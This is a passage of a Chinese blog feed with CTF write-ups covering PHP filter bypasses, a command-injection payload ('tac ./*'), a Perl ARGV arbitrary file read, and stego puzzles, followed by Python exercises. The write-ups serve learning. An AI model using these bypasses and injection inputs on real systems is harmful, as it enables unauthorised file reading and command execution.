<p>这里的preg_match(‘/^23333$/‘, $_GET[‘num’]要求结果为真，即num=23333,但是$_GET[‘num’] !== ‘23333’又不让num=23333，只能用%0a截断了<br>构造num=23333%0a，第一关算是过了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$string_1</span>))&#123;</span><br><span class="line">    <span class="variable">$md5_1</span> = md5(<span class="variable">$string_1</span>);</span><br><span class="line">    <span class="variable">$md5_2</span> = md5(<span class="variable">$string_2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = strtr(<span class="variable">$md5_1</span>, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="variable">$b</span> = strtr(<span class="variable">$md5_2</span>, <span class="string">'cxhp'</span>, <span class="string">'0123'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strtr函数转换字符串中特定的字符：<br><a href="https://www.runoob.com/php/func-string-strtr.html" target="_blank" rel="noopener">https://www.runoob.com/php/func-string-strtr.html</a><br>strtr(“abcde”,”ad”,”12”);//结果返回1bc2e，即a-&gt;1,d-&gt;2<br>此处代码意思是<br>str1 -&gt; string_1 -&gt; md5_1=md5(str1) &amp;&amp; md5_1中的’cxhp’替换为’0123’ -&gt; a<br>str2 -&gt; string_2 -&gt; md5_2=md5(str2) &amp;&amp; md5_2中的’cxhp’替换为’0123’ -&gt; b<br>要求 a==b,显然要找两个md5后以”ce”开头，因为替换后就会以”0e开头”，那样a==b就成立了<br>接下来的问题就是如何找这样两个字符串<br>参考链接:<a href="https://ctftime.org/writeup/8702" target="_blank" rel="noopener">https://ctftime.org/writeup/8702</a><br>然后我写了个python脚本跑了一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">count1=0</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(0,100000000000): </span><br><span class="line">    stra=str(j)</span><br><span class="line">    m2 = hashlib.md5()</span><br><span class="line">    m2.update(stra.encode(<span class="string">"utf-8"</span>)) </span><br><span class="line">    stra2=m2.hexdigest()</span><br><span class="line">    str3=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> stra2:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'c'</span>:str3+=<span class="string">'0'</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">'x'</span>:str3+=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">'h'</span>:str3+=<span class="string">'2'</span></span><br><span class="line">        <span class="keyword">elif</span> i==<span class="string">'p'</span>:str3+=<span class="string">'3'</span></span><br><span class="line">        <span class="keyword">else</span>:str3+=i</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> int(str3[3:]):</span><br><span class="line">            <span class="keyword">if</span> (stra2[:2]==<span class="string">"0e"</span>):</span><br><span class="line">                <span class="built_in">print</span>(stra+<span class="string">"   MD5替换后为  "</span>+stra2)</span><br><span class="line">                count1+=1</span><br><span class="line">    except ValueError: n=1</span><br><span class="line">    <span class="keyword">if</span> count1==2:<span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<p>得到了两个结果：2120624 和 9081940<br>构造str1=2120624&amp;str2=9081940<br>第二关结束</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$cmd</span>) &gt; 8)&#123;</span><br><span class="line">    die(<span class="string">"too long :("</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (substr_count(<span class="variable">$query</span>, <span class="string">'_'</span>) === 0 &amp;&amp; substr_count(<span class="variable">$query</span>, <span class="string">'%5f'</span>) === 0 )&#123;</span><br><span class="line">    <span class="variable">$arr</span> = explode(<span class="string">' '</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$arr</span>[0] !== <span class="string">'ls'</span> || <span class="variable">$arr</span>[0] !== <span class="string">'pwd'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(substr_count(<span class="variable">$cmd</span>, <span class="string">'cat'</span>) === 0)&#123;</span><br><span class="line">            system(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">'ban cat :) '</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">'bad guy!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'nonono _ is bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>$_SERVER[‘QUERY_STRING’]:获取查询，得到的时url中?后面的值<br>例如：<a href="https://zxfireworks.github.io?a=123&amp;b=456" target="_blank" rel="noopener">https://zxfireworks.github.io?a=123&amp;b=456</a><br>那么$_SERVER[‘QUERY_STRING’]=”a=123&amp;b=456”<br>参考链接：<a href="https://www.cnblogs.com/sanwenyu/p/4573943.html" target="_blank" rel="noopener">https://www.cnblogs.com/sanwenyu/p/4573943.html</a></p>
<p>substr_count() 函数计算子串在字符串中出现的次数<br>substr_count(string,substring,start,length)<br>参数string:被检索的字符串<br>    substring:要检索的字符串<br>参考链接：<a href="https://www.w3school.com.cn/php/func_string_substr_count.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_substr_count.asp</a></p>
<p>explode() 函数把字符串打散为数组</p>
<p>构造q.w.q=tac%20./*</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>NewBugku_Misc</title>
    <url>/2019/12/14/NewBugku-Misc/</url>
    <content><![CDATA[<h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>用winhex打开，直接搜索flag,找到flag<br>flag{bGxvdmV0aGVnaXJs},提交发现不对，看着有点像Base64编码，去解码,得到flag{llovethegirl}</p>
<a id="more"></a>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>直接给了flag,呃呃呃</p>
<h2 id="0和1的故事"><a href="#0和1的故事" class="headerlink" title="0和1的故事"></a>0和1的故事</h2><p>压缩包打开后只有一个flag{}.txt文件，打开后是Flag_is_not_here<br>根据题目应该是会出现二进制的，然后用winhex打开flag{}.txt<br>发现里面一串由20和09组成的16进制，就试着把20换为0，09换为1，然后转为16进制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">"0920200920092009092009200920090920200920200909092020200909092009200920090909092020202009090920090909090909202020202020"</span></span><br><span class="line">str2=str1.replace(<span class="string">'09'</span>,<span class="string">'1'</span>)</span><br><span class="line">str3=str2.replace(<span class="string">'20'</span>,<span class="string">'0'</span>)</span><br><span class="line"><span class="built_in">print</span>(str3)</span><br><span class="line"><span class="comment">#str3='10010101101010110010011100011101010111100001110111111000000'</span></span><br><span class="line">str4=hex(0b10010101101010110010011100011101010111100001110111111000000)</span><br><span class="line"><span class="built_in">print</span>(str4)</span><br><span class="line">str4=<span class="string">'0x4ad5938eaf0efc0'</span></span><br></pre></td></tr></table></figure>
<p>提交flag{0x4ad5938eaf0efc0},不正确，把前面的16进制标志0x去掉，提交成功</p>
<h2 id="这个人真的很高"><a href="#这个人真的很高" class="headerlink" title="这个人真的很高"></a>这个人真的很高</h2><p>根据题目，应该是要修改图片的高度，winhex打开修改高度，并且在最下面发现了一段字符串<br>aabI11us11ts1yy0}，保存后图片底部出现字符串ffoEliuaanrsgDey{<br>拼接在一起ffoEliuaanrsgDey{aabI11us11ts1yy0}，看起来像是栅栏密码，去解密<br>flag{Iss0finDa111}ourea11yEasybuty,就解出来了这个，去看了大佬的wp,竟然要自己把里面的单词组成一句流利的话，呃呃呃，flag{Iss0Easybutyourea11yfinDa111}</p>
<h2 id="easypdf"><a href="#easypdf" class="headerlink" title="easypdf"></a>easypdf</h2><p>pdf文件里就一张照片，之前遇见过类似的题目，flag就在照片下面，将pdf文件转为word文件，移除图片，出现flag{you_found_it}</p>
<h2 id="损坏的图片"><a href="#损坏的图片" class="headerlink" title="损坏的图片"></a>损坏的图片</h2><p>用winhex打开，直接没发现文件头，搜索RDHI,竟然在结尾找到了文件头，难道是16进制数据被倒序写入了，把图片的16进制导出，写个python脚本逆序一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">input1=open(<span class="string">"input.txt"</span>,<span class="string">'r'</span>)   <span class="comment">#input.txt是导出的16进制文件</span></span><br><span class="line">str1=input1.read()</span><br><span class="line">input1.close()</span><br><span class="line">str2=<span class="string">''</span></span><br><span class="line">count=0</span><br><span class="line">str3=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    str3+=i</span><br><span class="line">    count+=1</span><br><span class="line">    <span class="keyword">if</span>(count==2):</span><br><span class="line">        count=0</span><br><span class="line">        str2=str3+str2</span><br><span class="line">        str3=<span class="string">''</span></span><br><span class="line">output1=open(<span class="string">"output.txt"</span>,<span class="string">'w'</span>)   <span class="comment">#output1.txt是逆序后的16进制文件</span></span><br><span class="line">output1.write(str2)</span><br><span class="line">output1.close()</span><br></pre></td></tr></table></figure>
<p>用winhex将output1.txt中的16进制转为png图片(16进制区域右键-&gt;编辑-&gt;剪切板数据-&gt;粘贴-&gt;ASCII Hex)<br>保存后是一个二维码，QR Reaserch扫描二维码拿到flag{f3f4a1a0d4e8e8e1f4a0f}</p>
<h2 id="安慰的话语"><a href="#安慰的话语" class="headerlink" title="安慰的话语"></a>安慰的话语</h2><p>压缩包里一张照片，一个压缩包，但是被加密了，那应该就是得通过照片来获得密码<br>用winhex打开，一般这种都会有一个图种，放一个txt文件，所以直接搜索txt,还真有一个pass.txt文件<br>然后上Kali，分离出一个压缩包，里面有个pass.txt文件，打开后是一段佛语</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">佛曰：能那栗俱曰皤大夜呐漫侄依佛梵遮等諳顛老訶老諳者耨梵婆真輸故般豆輸俱明皤涅諳得缽跋無俱提至朋缽上實遮侄遮皤心菩呐老皤夷梵諦爍南咒怯心究呐明缽神罰故諳輸勝俱蘇一哆摩恐哆喝哆切切諳阿死哆若有摩缽真若夢姪侄離蒙哆倒是侄薩曰怯耶豆般利皤都若夜俱耨逝訶諳無侄悉涅皤波諳耶諳婆罰彌倒諳摩缽智梵闍怯波罰遠地若侄迦梵闍實殿侄依喝梵寫槃醯特三除竟呐滅諳究漫諳一等冥耶侄世地缽提吉羅皤除罰遮咒薩薩梵盡</span><br></pre></td></tr></table></figure>
<p>直接佛语解密</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">e58e8be7bca9e58c85e5af86e7a081e4b8ba7061737331323321212121</span><br></pre></td></tr></table></figure>
<p>看起来是16进制，用converter(Hex to Text)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">??????????????????pass123!!!!</span><br></pre></td></tr></table></figure>
<p>明显压缩包密码就是pass123!!!!,打开压缩包，套了好多层压缩包，在最后有一个虚空.txt文件，打开后是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JXU1MTZDJXU2QjYzJXU1MTZDJXU2QjYzJXU1MTZDJXU2QjYzJXU1M0NCJXU1NTg0JXU1MTZDJXU2QjYzJXU1MTZDJXU2QjYzJXU2QzExJXU0RTNCJXU1MTZDJXU2QjYzJXU2Q0Q1JXU2Q0JCJXU2Q0Q1JXU2Q0JCJXU4QkRBJXU0RkUxJXU2QzExJXU0RTNCJXU4MUVBJXU3NTMxJXU1M0NCJXU1NTg0JXU1MTZDJXU2QjYzJXU1MTZDJXU2QjYzJXU2NTZDJXU0RTFBJXU1MTZDJXU2QjYzJXU2Q0Q1JXU2Q0JCJXU1MTZDJXU2QjYzJXU3MjMxJXU1NkZEJXU2Q0Q1JXU2Q0JCJXU4MUVBJXU3NTMxJXU1RTczJXU3QjQ5JXU1M0NCJXU1NTg0JXU2NTZDJXU0RTFBJXU1MTZDJXU2QjYzJXU1M0NCJXU1NTg0JXU2NTZDJXU0RTFBJXU1MTZDJXU2QjYzJXU1MTZDJXU2QjYzJXU1RTczJXU3QjQ5JXU1M0NCJXU1NTg0JXU2NTZDJXU0RTFBJXU1MTZDJXU2QjYzJXU3MjMxJXU1NkZEJXU1MTZDJXU2QjYzJXU1M0NCJXU1NTg0JXU2NTZDJXU0RTFBJXU2Q0Q1JXU2Q0JCJXU1QkNDJXU1RjNBJXU1MTZDJXU2QjYzJXU1RTczJXU3QjQ5JXU2Q0Q1JXU2Q0JCJXU1M0NCJXU1NTg0JXU2Q0Q1JXU2Q0JC</span><br></pre></td></tr></table></figure>
<p>应该是base64，解码后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%u516C%u6B63%u516C%u6B63%u516C%u6B63%u53CB%u5584%u516C%u6B63%u516C%u6B63%u6C11%u4E3B%u516C%u6B63%u6CD5%u6CBB%u6CD5%u6CBB%u8BDA%u4FE1%u6C11%u4E3B%u81EA%u7531%u53CB%u5584%u516C%u6B63%u516C%u6B63%u656C%u4E1A%u516C%u6B63%u6CD5%u6CBB%u516C%u6B63%u7231%u56FD%u6CD5%u6CBB%u81EA%u7531%u5E73%u7B49%u53CB%u5584%u656C%u4E1A%u516C%u6B63%u53CB%u5584%u656C%u4E1A%u516C%u6B63%u516C%u6B63%u5E73%u7B49%u53CB%u5584%u656C%u4E1A%u516C%u6B63%u7231%u56FD%u516C%u6B63%u53CB%u5584%u656C%u4E1A%u6CD5%u6CBB%u5BCC%u5F3A%u516C%u6B63%u5E73%u7B49%u6CD5%u6CBB%u53CB%u5584%u6CD5%u6CBB</span><br></pre></td></tr></table></figure>
<p>是url，解码后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">公正公正公正友善公正公正**公正法治法治诚信**自由友善公正公正敬业公正法治公正爱国法治自由平等友善敬业公正友善敬业公正公正平等友善敬业公正爱国公正友善敬业法治富强公正平等法治友善法治</span><br></pre></td></tr></table></figure>
<p>是社会主义核心价值观加密，里面有两处被密了，那就试试，最后发现是民主，解密后<br>flag{Light_of_hope}</p>
]]></content>
      <categories>
        <category>CTF-Misc</category>
      </categories>
  </entry>
  <entry>
    <title>Perl网页文件+ARGV上传任意文件读取</title>
    <url>/2020/02/21/Perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6-ARGV%E4%B8%8A%E4%BC%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
    <content><![CDATA[<p><img src="http://q63cs67co.bkt.clouddn.com/Perl_ARGV.jpg" alt="Perl_ARGV"><br>上传一个11.php文件,内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>用burpsuite抓包<br><img src="http://q63cs67co.bkt.clouddn.com/bp.PNG" alt=""><br>将上传的文件类型及文件内容处复制再粘贴一行，将filename去掉，然后内容填入ARGV<br><img src="http://q63cs67co.bkt.clouddn.com/bp2.PNG" alt=""><br><img src="http://q63cs67co.bkt.clouddn.com/bp3.PNG" alt=""></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Python</title>
    <url>/2020/01/10/Python/</url>
    <content><![CDATA[<h2 id="高精度加法"><a href="#高精度加法" class="headerlink" title="高精度加法"></a>高精度加法</h2><p>题目叙述：输入两个整数a和b，输出这两个整数的和。a和b都不超过100位。由于a和b都比较大，所以不能直接使用语言中的标准数据类型来存储。对于这种问题，一般使用数组来处理。<br>　　定义一个数组A，A[0]用于存储a的个位，A[1]用于存储a的十位，依此类推。同样可以用一个数组B来存储b。<br>　　计算c = a + b的时候，首先将A[0]与B[0]相加，如果有进位产生，则把进位（即和的十位数）存入r，把和的个位数存入C[0]，即C[0]等于(A[0]+B[0])%10。然后计算A[1]与B[1]相加，这时还应将低位进上来的值r也加起来，即C[1]应该是A[1]、B[1]和r三个数的和．如果又有进位产生，则仍可将新的进位存入到r中，和的个位存到C[1]中。依此类推，即可求出C的所有位。<br>　　最后将C输出即可。<br>输入样例:<br>20100122201001221234567890<br>2010012220100122</p>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">number11=input()</span><br><span class="line">number21=input()</span><br><span class="line">number1=<span class="string">"&#123;:0&gt;100&#125;"</span>.format(number11)</span><br><span class="line">number2=<span class="string">"&#123;:0&gt;100&#125;"</span>.format(number21)</span><br><span class="line">result=[0]*(101)</span><br><span class="line">count=0</span><br><span class="line">jinwei=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(100):</span><br><span class="line">    tmp=int(number1[100-i-1])+int(number2[100-i-1])+jinwei</span><br><span class="line">    <span class="keyword">if</span> tmp&gt;=10:</span><br><span class="line">        result[count]=result[count]+tmp%10</span><br><span class="line">        jinwei=tmp//10</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[count]=result[count]+tmp</span><br><span class="line">        jinwei=0</span><br><span class="line">    count=count+1</span><br><span class="line">result.reverse()</span><br><span class="line">str1=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    str1=str1+str(i)</span><br><span class="line"><span class="built_in">print</span>(str1.lstrip(<span class="string">'0'</span>))</span><br></pre></td></tr></table></figure>
<h2 id="特殊的数字"><a href="#特殊的数字" class="headerlink" title="特殊的数字"></a>特殊的数字</h2><p>题目叙述：153是一个非常特殊的数，它等于它的每位数字的立方和，即153=1<em>1</em>1+5<em>5</em>5+3<em>3</em>3。编程求所有满足这种条件的三位十进制数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> range(100,999):</span><br><span class="line">    n1=number%10</span><br><span class="line">    n2=(number%100)//10</span><br><span class="line">    n3=number//100</span><br><span class="line">    <span class="keyword">if</span> pow(n1,3)+pow(n2,3)+pow(n3,3)==number:</span><br><span class="line">        <span class="built_in">print</span>(number)</span><br></pre></td></tr></table></figure>
<h2 id="阶乘计算"><a href="#阶乘计算" class="headerlink" title="阶乘计算"></a>阶乘计算</h2><p>题目叙述：输入一个正整数n，输出n!的值。其中n!=1<em>2</em>3<em>…</em>n。<br>n!可能很大，而计算机能表示的整数范围有限，需要使用高精度计算的方法。使用一个数组A来表示一个大整数a，A[0]表示a的个位，A[1]表示a的十位，依次类推。将a乘以一个整数k变为将数组A的每一个元素都乘以k，请注意处理相应的进位。首先将a设为1，然后乘2，乘3，当乘到n时，即得到了n!的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">number=int(input())</span><br><span class="line">result=1</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,number+1):</span><br><span class="line">    result=result*i</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<h2 id="01字串"><a href="#01字串" class="headerlink" title="01字串"></a>01字串</h2><p>题目叙述：对于长度为5位的一个01串，每一位都可能是0或1，一共有32种可能。它们的前几个是：</p>
<p>00000</p>
<p>00001</p>
<p>00010</p>
<p>00011</p>
<p>00100</p>
<p>请按从小到大的顺序输出这32种01串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> range(0,32):</span><br><span class="line">    str1=<span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> number&gt;0:</span><br><span class="line">        n1=number%2</span><br><span class="line">        number=number//2</span><br><span class="line">        str1=str(n1)+str1</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"&#123;:0&gt;5&#125;"</span>.format(str1))</span><br></pre></td></tr></table></figure>
<h2 id="核桃的数量"><a href="#核桃的数量" class="headerlink" title="核桃的数量"></a>核桃的数量</h2><p>题目描述：小张是软件项目经理，他带领3个开发组。工期紧，今天都在加班呢。为鼓舞士气，小张打算给每个组发一袋核桃（据传言能补脑）。他的要求是：</p>
<ol>
<li><p>各组的核桃数量必须相同</p>
</li>
<li><p>各组内必须能平分核桃（当然是不能打碎的）</p>
</li>
<li><p>尽量提供满足1,2条件的最小数量（节约闹革命嘛）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本质上是求这三个数的最小公倍数</span></span><br><span class="line">str1=input()</span><br><span class="line">list1=str1.split(<span class="string">' '</span>)</span><br><span class="line">a=int(list1[0])</span><br><span class="line">b=int(list1[1])</span><br><span class="line">c=int(list1[2])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,10000):</span><br><span class="line">    <span class="keyword">if</span>(i%a==0 and i%b==0 and i%c==0):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure>
<h2 id="解二元一次方程组"><a href="#解二元一次方程组" class="headerlink" title="解二元一次方程组"></a>解二元一次方程组</h2><p>题目叙述：给定一个二元一次方程组，形如：<br>　　a * x + b * y = c;<br>　　d * x + e * y = f;<br>　　x,y代表未知数，a, b, c, d, e, f为参数。<br>　　求解x,y</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a*x+b*y=c</span></span><br><span class="line"><span class="comment"># d*x+e*y=f</span></span><br><span class="line">str1=input()</span><br><span class="line">list1=str1.split(<span class="string">' '</span>)</span><br><span class="line">a=int(list1[0])</span><br><span class="line">b=int(list1[1])</span><br><span class="line">c=int(list1[2])</span><br><span class="line">d=int(list1[3])</span><br><span class="line">e=int(list1[4])</span><br><span class="line">f=int(list1[5])</span><br><span class="line">x=(c*e-b*f)/(a*e-b*d)</span><br><span class="line">y=(a*f-c*d)/(a*e-b*d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"&#123;&#125; &#123;&#125;"</span>.format(int(x),int(y)))</span><br></pre></td></tr></table></figure>
<h2 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2><p>题目叙述：1221是一个非常特殊的数，它从左边读和从右边读是一样的，编程求所有这样的四位十进制数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> range(1000,9999):</span><br><span class="line">    n1=number%10</span><br><span class="line">    n2=(number%100)//10</span><br><span class="line">    n3=(number%1000)//100</span><br><span class="line">    n4=number//1000</span><br><span class="line">    <span class="keyword">if</span> n1==n4 and n2==n3:</span><br><span class="line">        <span class="built_in">print</span>(number,end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure>
<h2 id="特殊的回文数"><a href="#特殊的回文数" class="headerlink" title="特殊的回文数"></a>特殊的回文数</h2><p>123321是一个非常特殊的数，它从左边读和从右边读是一样的。输入一个正整数n， 编程求所有这样的五位和六位十进制数，满足各位数字之和等于n 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=int(input())</span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> range(10000,999999): </span><br><span class="line">    count=0</span><br><span class="line">    i=number</span><br><span class="line">    m=0</span><br><span class="line">    <span class="keyword">while</span> i&gt;0:</span><br><span class="line">        m=m*10+i%10   </span><br><span class="line">        count=count+i%10</span><br><span class="line">        i=i//10</span><br><span class="line">    <span class="keyword">if</span> m==number and count==str1:</span><br><span class="line">        <span class="built_in">print</span>(number)</span><br></pre></td></tr></table></figure>
<h2 id="数列特征"><a href="#数列特征" class="headerlink" title="数列特征"></a>数列特征</h2><p>题目叙述：给出n个数，找出这n个数的最大值，最小值，和。<br>第一行为整数n，表示数的个数。<br>第二行有n个数，为给定的n个数，每个数的绝对值都小于10000。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">number1=int(input())</span><br><span class="line">str1=input()</span><br><span class="line">str2=str1.split()</span><br><span class="line">list1=list(str2)</span><br><span class="line">list1.sort()</span><br><span class="line"><span class="built_in">print</span>(list1[number1-1])</span><br><span class="line"><span class="built_in">print</span>(list1[0])</span><br><span class="line">count=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    tmp=int(i)</span><br><span class="line">    count=count+tmp</span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure>
<h2 id="数列排序"><a href="#数列排序" class="headerlink" title="数列排序"></a>数列排序</h2><p>题目叙述：给定一个长度为n的数列，将这个数列按从小到大的顺序排列。1&lt;=n&lt;=200<br>第一行为一个整数n。<br>第二行包含n个整数，为待排序的数，每个整数的绝对值小于10000。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=input()</span><br><span class="line">n=int(str1)</span><br><span class="line">str2=input()</span><br><span class="line">list1=str2.split()</span><br><span class="line">list2=[0]*len(list1)</span><br><span class="line">count=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">if</span> count&lt;len(list1):</span><br><span class="line">        list2[count]=int(i)</span><br><span class="line">        count=count+1</span><br><span class="line">list2.sort()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">" "</span>)</span><br></pre></td></tr></table></figure>
<h2 id="十进制转十六进制"><a href="#十进制转十六进制" class="headerlink" title="十进制转十六进制"></a>十进制转十六进制</h2><p>题目叙述：十六进制数是在程序设计时经常要使用到的一种整数的表示方式。它有0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F共16个符号，分别表示十进制数的0至15。十六进制的计数方法是满16进1，所以十进制数16在十六进制中是10，而十进制的17在十六进制中是11，以此类推，十进制的30在十六进制中是1E。给出一个非负整数，将它表示成十六进制的形式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d=int(input())</span><br><span class="line">h=hex(d)</span><br><span class="line"><span class="built_in">print</span>(h.upper()[2:])</span><br></pre></td></tr></table></figure>
<h2 id="十六进制转十进制"><a href="#十六进制转十进制" class="headerlink" title="十六进制转十进制"></a>十六进制转十进制</h2><p>题目叙述：从键盘输入一个不超过8位的正的十六进制数字符串，将它转换为正的十进制数后输出。<br>注：十六进制数中的10~15分别用大写的英文字母A、B、C、D、E、F表示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=input()</span><br><span class="line">list1=[0]*(len(str1))</span><br><span class="line">count1=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">if</span> i&lt;=<span class="string">'9'</span>:list1[count1]=int(i)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">'A'</span>:list1[count1]=10</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">'B'</span>:list1[count1]=11</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">'C'</span>:list1[count1]=12</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">'D'</span>:list1[count1]=13</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">'E'</span>:list1[count1]=14</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">'F'</span>:list1[count1]=15</span><br><span class="line">    count1=count1+1</span><br><span class="line">str2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    h_b=i</span><br><span class="line">    str1=<span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> h_b&gt;0:</span><br><span class="line">        n1=h_b%2</span><br><span class="line">        h_b=h_b//2</span><br><span class="line">        str1=str(n1)+str1</span><br><span class="line">    str2=str2+<span class="string">"&#123;:0&gt;4&#125;"</span>.format(str1)</span><br><span class="line"></span><br><span class="line">add_0=3-(len(str2)%3)</span><br><span class="line">str2=<span class="string">'0'</span>*add_0+str2</span><br><span class="line"></span><br><span class="line">result=0</span><br><span class="line">count2=len(str2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str2:</span><br><span class="line">    result=result+int(i)*pow(2,count2-1)</span><br><span class="line">    count2=count2-1</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<h2 id="十六进制转八进制"><a href="#十六进制转八进制" class="headerlink" title="十六进制转八进制"></a>十六进制转八进制</h2><p>题目叙述：给定n个十六进制正整数，输出它们对应的八进制数。<br>输入的第一行为一个正整数n （1&lt;=n&lt;=10）。<br>接下来n行，每行一个由0<del>9、大写字母A</del>F组成的字符串，表示要转换的十六进制正整数，每个十六进制数长度不超过100000。<br>样例输入<br>　　2<br>　　39<br>　　123ABC</p>
